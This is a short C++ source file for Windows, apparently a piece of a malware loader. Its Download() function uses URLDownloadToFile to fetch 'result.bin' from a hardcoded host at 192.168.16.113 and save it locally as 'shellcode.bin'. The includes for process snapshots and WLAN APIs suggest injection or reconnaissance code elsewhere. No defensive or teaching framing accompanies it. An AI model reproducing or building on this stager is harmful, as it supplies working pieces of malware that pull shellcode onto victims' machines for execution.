#include <windows.h>
#include <cstdio>
#include <iostream>
#include <wlanapi.h>
#include <TlHelp32.h>
#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "Urlmon.lib")
using namespace std;
#include "connector.h"
#ifdef __cplusplus
extern "C" {
#endif

    int Download() {
	const wchar_t* srcURL;
	srcURL = L"http://192.168.16.113/result.bin"; 
        const wchar_t* destFile = L"shellcode.bin";
        if (S_OK == URLDownloadToFile(NULL, srcURL, destFile, 0, NULL)) {
            //printf("Saved to 'shellcode.bin' \n");
            return 0;
        }

        else {

            //printf("\nFailed Dowloading shellcode file \n");
            return -1;

        }

    }

	

#ifdef __cplusplus
}
#endif
